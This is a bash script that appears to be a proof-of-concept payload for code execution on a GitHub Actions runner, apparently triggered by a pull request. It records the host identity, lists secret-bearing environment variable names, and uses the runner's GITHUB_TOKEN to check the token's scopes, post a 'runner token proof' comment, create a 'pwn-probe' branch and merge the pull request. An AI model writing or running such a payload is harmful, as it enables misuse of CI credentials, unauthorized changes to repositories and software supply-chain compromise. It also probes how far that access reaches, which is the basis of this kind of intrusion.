#!/bin/bash
set -u
echo "===== RCE-PROOF-START ====="
id
uname -a
echo "PWD=$(pwd)"
echo "INIT_CWD=${INIT_CWD:-}"
echo "GITHUB_REPOSITORY=${GITHUB_REPOSITORY:-}"
echo "TOKEN_LEN=${#GITHUB_TOKEN}"
echo "--- env names matching token/secret/key ---"
env | cut -d= -f1 | grep -Ei 'token|secret|key|azure|playground|flag' || true
echo "--- GET /repos authenticated ---"
curl -sS -D /tmp/h.txt -o /tmp/repo.json \
  -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/$GITHUB_REPOSITORY"
grep -iE "^(HTTP|x-oauth-scopes|x-accepted-github-permissions)" /tmp/h.txt || true
python3 - <<'PY'
import json
d=json.load(open('/tmp/repo.json'))
print('LOGIN', d.get('full_name'))
print('PERMISSIONS', json.dumps(d.get('permissions')))
PY
echo "--- POST comment probe ---"
PRN=$(tr -dc '0-9' < "${INIT_CWD:-.}/pr-number.txt")
echo "PRN=$PRN"
curl -sS -o /tmp/c.json -w 'COMMENT_STATUS=%{http_code}\n' -X POST \
  -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/$PRN/comments" \
  -d "{\"body\":\"runner token proof: RCE on $(hostname) as $(id -un), token_len ${#GITHUB_TOKEN}\"}"
head -c 400 /tmp/c.json; echo
echo "--- POST git/ref probe (contents:write?) ---"
MAINSHA=$(curl -sS -H "Authorization: Bearer $GITHUB_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY/commits/main" | python3 -c 'import json,sys;print(json.load(sys.stdin)["sha"])')
echo "MAINSHA=$MAINSHA"
curl -sS -o /tmp/r.json -w 'REF_STATUS=%{http_code}\n' -X POST \
  -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/git/refs" \
  -d "{\"ref\":\"refs/heads/pwn-probe\",\"sha\":\"$MAINSHA\"}"
head -c 300 /tmp/r.json; echo
echo "--- merge probe ---"
curl -sS -o /tmp/m.json -w 'MERGE_STATUS=%{http_code}\n' -X PUT \
  -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/pulls/$PRN/merge" -d '{"merge_method":"merge"}'
head -c 300 /tmp/m.json; echo
echo "===== RCE-PROOF-END ====="
